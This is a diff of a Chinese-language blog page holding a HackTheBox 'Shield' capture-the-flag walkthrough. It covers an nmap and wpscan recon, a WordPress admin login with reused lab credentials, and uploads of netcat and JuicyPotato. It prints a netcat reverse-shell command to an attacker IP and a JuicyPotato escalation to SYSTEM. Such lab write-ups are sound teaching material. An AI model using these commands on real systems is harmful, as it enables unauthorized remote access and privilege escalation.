@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="实验环境 信息收集端口扫描： namp -A -T4 10.10.10.29  发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows  --script vuln参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址  目录扫描，也发现wordpress目录  Wpscan分析，可以看到wordpress的版本 wpscan --url http:&#x2F;">
+    <meta name="description" content="实验环境 信息收集端口扫描： 1namp -A -T4 10.10.10.29  发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows  --script vuln参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址  目录扫描，也发现wordpress目录  Wpscan分析，可以看到wordpress的版本 1wpscan --url http">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-Shield">
 <meta property="og:url" content="http://example.com/2021/08/18/HackTheBox-Shield/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="实验环境 信息收集端口扫描： namp -A -T4 10.10.10.29  发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows  --script vuln参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址  目录扫描，也发现wordpress目录  Wpscan分析，可以看到wordpress的版本 wpscan --url http:&#x2F;">
+<meta property="og:description" content="实验环境 信息收集端口扫描： 1namp -A -T4 10.10.10.29  发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows  --script vuln参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址  目录扫描，也发现wordpress目录  Wpscan分析，可以看到wordpress的版本 1wpscan --url http">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png">
 <meta property="og:image" content="https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png">
@@ -183,8 +183,8 @@
   <div class="content" itemprop="articleBody">
     <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png"></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>
-<pre><code>namp -A -T4 10.10.10.29
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -A -T4 10.10.10.29</span><br></pre></td></tr></table></figure>
+
 <p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>
 <p><img src="https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png"></p>
 <p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>
@@ -192,8 +192,8 @@
 <p><strong>目录扫描</strong>，也发现wordpress目录</p>
 <p><img src="https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png"></p>
 <p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>
-<pre><code>wpscan --url http://10.10.10.29/wordpress
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.29/wordpress</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png"></p>
 <h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>
 <p><img src="https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png"></p>
@@ -220,14 +220,14 @@
 <p>将js.exe上传到对方机器</p>
 <p><img src="https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png"></p>
 <p>在windows shell中生成一个bat脚本：</p>
-<pre><code>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png"></p>
 <p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>
 <p><img src="https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png"></p>
 <p>运行juicy-potato提权：</p>
-<pre><code>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png"></p>
 <p>获得system权限的windows shell</p>
 <p><img src="https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png"></p>
